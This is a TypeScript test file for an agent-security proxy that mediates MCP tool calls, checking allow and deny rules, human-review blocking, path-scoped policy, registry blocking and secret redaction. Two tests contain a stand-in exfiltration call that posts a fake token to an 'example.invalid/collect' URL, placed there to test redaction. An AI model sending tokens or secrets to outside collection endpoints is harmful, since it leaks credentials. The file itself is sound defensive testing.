import { createToolFingerprint, stableHash, verifyEvidenceBundle } from "@agentshield/core";
import { createLocalRegistry } from "@agentshield/registry";
import { describe, expect, it } from "vitest";
import { MockMcpServer } from "../mock/mockMcpServer.js";
import { McpProxySession } from "./mcpProxySession.js";

const config = {
  mode: "mock" as const,
  maxMessageBytes: 1024 * 1024,
  allowMethods: ["tools/list", "tools/call"] as Array<"tools/list" | "tools/call">
};

function call(id: string, name: string, args: Record<string, unknown> = {}) {
  return { jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } };
}

describe("McpProxySession", () => {
  it("forwards allowed tools/call", () => {
    const server = new MockMcpServer();
    const session = new McpProxySession({ config, server });
    const response = session.handle(call("read", "filesystem.read", { path: "/mock/project/README.md" }));

    expect(response.error).toBeUndefined();
    expect(server.callCount("filesystem.read")).toBe(1);
  });

  it("blocks denied tools/call", () => {
    const server = new MockMcpServer();
    const session = new McpProxySession({ config, server });
    const response = session.handle(call("unknown", "unknown.tool"));

    expect(response.error?.code).toBe(-32001);
    expect(server.callCount("unknown.tool")).toBe(0);
  });

  it("blocks require_human_review tools/call", () => {
    const server = new MockMcpServer();
    const session = new McpProxySession({
      config,
      server,
      policy: {
        version: 1,
        defaultDecision: "deny",
        rules: [{ id: "allow-all", match: { actionType: "tool_call" }, decision: "allow" }]
      }
    });

    session.handle(call("write", "filesystem.write", { path: "/mock/project/a.js", content: "x" }));
    const response = session.handle(call("exec", "shell.exec", { path: "/mock/project/a.js", command: "node /mock/project/a.js" }));

    expect(response.error).toBeDefined();
    expect(server.callCount("shell.exec")).toBe(0);
  });

  it("unsupported method returns method-not-found", () => {
    const session = new McpProxySession({ config });
    expect(session.handle({ jsonrpc: "2.0", id: "x", method: "unknown" })).toMatchObject({
      error: { code: -32601 }
    });
  });

  it("response redacts fake secret", () => {
    const session = new McpProxySession({ config });
    const response = session.handle(call("network", "network.post", { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" }));

    expect(JSON.stringify(response)).not.toContain("sk-test-REDACT-ME");
  });

  it("proxy evidence verifies when enabled", () => {
    const session = new McpProxySession({ config });
    session.handle(call("network", "network.post", { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" }));
    const bundle = session.createEvidenceBundle();

    expect(bundle).toBeDefined();
    expect(JSON.stringify(bundle)).not.toContain("sk-test-REDACT-ME");
    expect(verifyEvidenceBundle(bundle!)).toMatchObject({ valid: true });
  });

  it("proxy works with v2 strict policy", () => {
    const session = new McpProxySession({
      config,
      policy: {
        version: 2,
        name: "strict",
        defaultDecision: "deny",
        mode: "strict",
        rules: [
          {
            id: "allow-read",
            effect: "allow",
            priority: 1,
            match: {
              capability: "filesystem.read",
              resource: { type: "filesystem", allow: ["/mock/project/**"] }
            }
          }
        ]
      }
    });

    expect(session.handle(call("read", "filesystem.read", { path: "/mock/project/README.md" })).error).toBeUndefined();
    expect(session.handle(call("read2", "filesystem.read", { path: "/mock/other/secret.txt" })).error).toBeDefined();
  });

  it("does not forward blocked registry tools", () => {
    const server = new MockMcpServer();
    const metadata = server.getToolMetadata("filesystem.read")!;
    const fingerprint = createToolFingerprint(metadata);
    const toolRegistry = createLocalRegistry({
      version: 1,
      name: "r",
      generatedAt: "now",
      entries: [
        {
          version: 1,
          toolName: metadata.toolName,
          serverName: metadata.serverName,
          trustLevel: "blocked",
          expectedFingerprint: {
            schemaHash: fingerprint.schemaHash,
            descriptionHash: fingerprint.descriptionHash,
            capabilityHash: stableHash(fingerprint.capabilities)
          },
          declaredCapabilities: metadata.capabilities,
          riskLevel: "critical"
        }
      ]
    });
    const session = new McpProxySession({ config, server, toolRegistry });
    const response = session.handle(call("read", "filesystem.read", { path: "/mock/project/README.md" }));

    expect(response.error?.code).toBe(-32001);
    expect(server.callCount("filesystem.read")).toBe(0);
  });
});
